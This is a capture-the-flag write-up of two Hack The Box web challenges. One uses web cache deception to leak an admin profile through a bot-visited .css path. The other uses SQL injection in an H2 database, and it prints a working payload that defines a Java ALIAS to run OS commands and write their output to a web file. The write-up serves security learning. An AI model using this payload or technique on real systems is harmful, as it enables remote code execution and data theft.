# Writeup_HTB_Web_Challenge
Write-up Web Challenge Hack The Box

## Table of Content
[CDNio](#cdnio)

[Pentest Notes](#pentest-notes)

[Pentest Notes](#insomnia)

## <a name="cdnio"></a> 	:triangular_flag_on_post: CDNio
Overview of the site have features: 
- register a new account with username, password, email
- search user profile

![image](https://github.com/user-attachments/assets/d621d82a-ce68-4e16-8f6a-0f4fc5fb9633)

![image](https://github.com/user-attachments/assets/d10678e2-f424-4a92-8b24-ab72c1205b6c)

We can see this web have api `/register` and `/profile`
![image](https://github.com/user-attachments/assets/0b63a3e3-e1d6-4a65-adc0-73ce8476e5a8)

Let's see source code

Noteworthy is this config file
![image](https://github.com/user-attachments/assets/eda95f81-341a-462b-b8a2-3ab544188c91)

`location ~* \.(css|js|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot)$`
a regex allow all url have static extension

```
  proxy_cache cache;
  proxy_cache_valid 200 3m;
  ...
  add_header Cache-Control "public";   
```

and cache them in 3m for anyone read public. We can think of [web cache deception](https://portswigger.net/web-security/web-cache-deception) vulnerability

I have to test my hypothesis, api `/profile` have profile of user and admin. I will request to server `GET /profile/test.css`, if response returned is 200, it means the information has been cached

![image](https://github.com/user-attachments/assets/4ff05369-028c-4a92-bc58-70b5b82b92df)

If admin access `/profile/test.css`, profile admin also cache. But how to make admin access?
In folder bot have a `route.py` defined an api `/visit` request to url, line 20 will call `bot_thread()` method defined `utils/bot.py`

![image](https://github.com/user-attachments/assets/848fbe55-6ea4-4bc4-88dc-5fddd7a8345b)

`bot.py` will request to admin profile in server

![image](https://github.com/user-attachments/assets/188bb880-6461-462b-bba4-d43c119f0a66)

So, i send request uri `profile/test.css` via api `/visit`, uri will send to `bot.py` and get profile admin

![image](https://github.com/user-attachments/assets/dd358258-cb23-4d39-95c2-7d120bcff363)

Response 200 mean profile admin has been leak

![image](https://github.com/user-attachments/assets/47c10b6a-6468-442c-a422-1beb26b75c8a)

Get request to `profile/test.css` and done, receive flag

![image](https://github.com/user-attachments/assets/e12e788e-3746-4841-aef6-c36f49f0cf5e)

## <a name="pentest-notes"></a> 	:triangular_flag_on_post: Pentest Notes
Overview site, some feature:
- register, login

![image](https://github.com/user-attachments/assets/f8323701-3cd1-4b08-865f-15be739080b5)
![image](https://github.com/user-attachments/assets/1f1cfd74-b0d9-4c7a-b29e-8204d1381e34)

- list pentest, notes

![image](https://github.com/user-attachments/assets/63b1097a-c52f-4d0d-aa95-ddd078503e5a)
![image](https://github.com/user-attachments/assets/74c5f5a9-1c4d-4a25-a0ca-7f12b8a06198)

In page Note detail, we can see a parameter `name` 

![image](https://github.com/user-attachments/assets/0e306909-5323-4f44-82b3-df2fe236cb60)

Audit source, in `NotesController.java` param `name` insert to query

![image](https://github.com/user-attachments/assets/381adc91-3d7d-46de-b204-c04a1685701f)

This is SQL Injection vulnerability, we can insert query to leak data in database. 

Test the above hypothesis

![image](https://github.com/user-attachments/assets/14f2f8e5-67d0-4e0f-a92e-504e3840cf2e)

So, this web have SQL Injection, i will see schema of database to get data like table name, user. However, just NOTES table can access by query, and other tables can't get data

![image](https://github.com/user-attachments/assets/fa835a5e-9d5c-48b8-8aad-1e63cd9e6a6d)

Like table `TABLE_PRIVILEGES` i select to column in table but response 500. 
File pom.xml in source code, a dependency is h2.database, that mean this challenge use H2 database. I tried search [vulnerability about H2 DB](https://www.exploit-db.com/exploits/45506). This vulnerability about feature of database, build a ALIAS with java code to run shell in server. So, we can run java code via feature ALIAS of H2 database

I'm tried this payload, and we can pass parameter OS Command to RCE
``` java
SQL Injection' OR 1=0; CREATE ALIAS RCE AS '
    String execve(String cmd) throws java.io.IOException { 
        Process process = Runtime.getRuntime().exec(cmd); 
        java.io.InputStream inputStream = process.getInputStream(); 
        java.io.FileOutputStream fileOutputStream = new java.io.FileOutputStream("/app/target/classes/static/hola.html");
        byte[] buffer = new byte[1024]; 
        int bytesRead; 
        while ((bytesRead = inputStream.read(buffer)) != -1) { 
            fileOutputStream.write(buffer, 0, bytesRead);
        } 
        fileOutputStream.close(); 
        inputStream.close(); 
        return "Output written to /app/target/classes/static/hola.html";
    }'; -- -
```

![image](https://github.com/user-attachments/assets/c7e0a44d-60bf-4fab-b857-82f2954d36c5)

And now, we can call ALIAS and pass OS Command

![image](https://github.com/user-attachments/assets/7994e97e-d112-4f69-8654-3c9d11e6888e)

![image](https://github.com/user-attachments/assets/edd7398a-a39a-43c0-863d-679ba74b0aa5)

![image](https://github.com/user-attachments/assets/56e60c11-77ea-442c-a851-fb6e98c0d76b)

## <a name="insomnia"></a> 	:triangular_flag_on_post: Insomnia
